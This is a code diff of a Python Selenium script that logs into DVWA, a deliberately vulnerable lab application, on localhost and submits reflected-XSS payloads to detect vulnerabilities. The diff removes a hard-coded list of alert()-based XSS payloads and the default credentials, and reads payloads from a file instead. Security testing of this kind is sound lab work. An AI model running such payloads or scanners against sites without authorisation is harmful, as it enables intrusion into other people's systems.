@@ -4,33 +4,41 @@ from selenium.webdriver.common.keys import Keys
 from selenium.common.exceptions import StaleElementReferenceException
 import time
 
-# XSS payloads to test
-xss_payloads = [
-    '<script>alert("XSS1")</script>',
-    '"><script>alert("XSS2")</script>',
-    "';alert(String.fromCharCode(88,83,83))//",
-    "<img src=x onerror=alert('XSS3')>",
-    "<svg onload=alert('XSS4')>",
-    "<body onload=alert('XSS5')>"
-]
-
-# URLs
-login_url = "http://localhost/DVWA/login.php"
-xss_url = "http://localhost/DVWA/vulnerabilities/xss_r/"
-
-# Login credentials
-username = "admin"
-password = "password"
+# Function to load XSS payloads from a file
+# Function to load XSS payloads from a file
+def load_payloads(filename):
+    try:
+        with open(filename, 'r', encoding='utf-8') as file:  # Specify the encoding
+            payloads = file.read().splitlines()  # Read the file and split it into lines
+        return payloads
+    except FileNotFoundError:
+        print(f"Error: {filename} not found.")
+        return []
+    except UnicodeDecodeError as e:
+        print(f"UnicodeDecodeError: {e}. Please ensure the file is encoded in UTF-8.")
+        return []
 
 # Function to test XSS payloads using Selenium
 def test_xss_with_browser():
+    # Ask for user inputs
+    login_url = input("Enter the login URL (e.g., http://localhost/DVWA/login.php): ")
+    username = input("Enter the username: ")
+    password = input("Enter the password: ")
+
+    # Load the XSS payloads from the payloads.txt file
+    xss_payloads = load_payloads('B-payloads.txt')
+    if not xss_payloads:
+        print("No payloads found. Exiting.")
+        return
+
     # Set up Selenium WebDriver (ensure you have the right driver for your browser)
     driver = webdriver.Chrome()  # Use 'webdriver.Firefox()' for Firefox
+    detected_payloads = []  # To store detected payloads
     try:
         # Open the login page
         driver.get(login_url)
         print("Opened login page.")
-        
+
         # Find the username, password fields and login button
         username_field = driver.find_element(By.NAME, "username")
         password_field = driver.find_element(By.NAME, "password")
@@ -40,7 +48,15 @@ def test_xss_with_browser():
         username_field.send_keys(username)
         password_field.send_keys(password)
         login_button.click()
+        time.sleep(2)  # Wait for the login to complete
+        # if the login is successful
+        if "Login failed" in driver.page_source:
+            print("Login failed. Exiting.")
+            return
         print("Logged in successfully.")
+        
+        # Get the URL of the XSS vulnerability page
+        xss_url = input("Enter the XSS URL (e.g., http://localhost/DVWA/vulnerabilities/xss_r/): ")
         
         # Navigate to the XSS vulnerability page
         driver.get(xss_url)
@@ -73,20 +89,28 @@ def test_xss_with_browser():
                     
                     # Submit the form
                     form.submit()
-                    time.sleep(2)  # Wait for the response to load
+                    # time.sleep(2)  # Wait for the response to load
                     
                     # Check if the payload is reflected in the page source
-                    if payload in driver.page_source:
+                    if payload in driver.page_source and payload not in detected_payloads:
+                        detected_payloads.append(payload)  # Add to the list of detected payloads
                         print(f"Potential XSS vulnerability detected!\nPayload: {payload}")
-                        break
+                    
                 except StaleElementReferenceException:
                     print("Encountered StaleElementReferenceException. Re-locating elements...")
                     continue
         
+        if detected_payloads:
+            print(f"\nXSS vulnerabilities detected for the following payloads:")
+            for detected in detected_payloads:
+                print(detected)
+        else:
+            print("No XSS vulnerabilities detected.")
+
         print("XSS testing completed.")
     finally:
         # Keep the browser open for debugging or close it after a delay
-        time.sleep(10)  # Adjust as needed for debugging
+        time.sleep(1)  # Adjust as needed for debugging
         driver.quit()
 
 # Main function
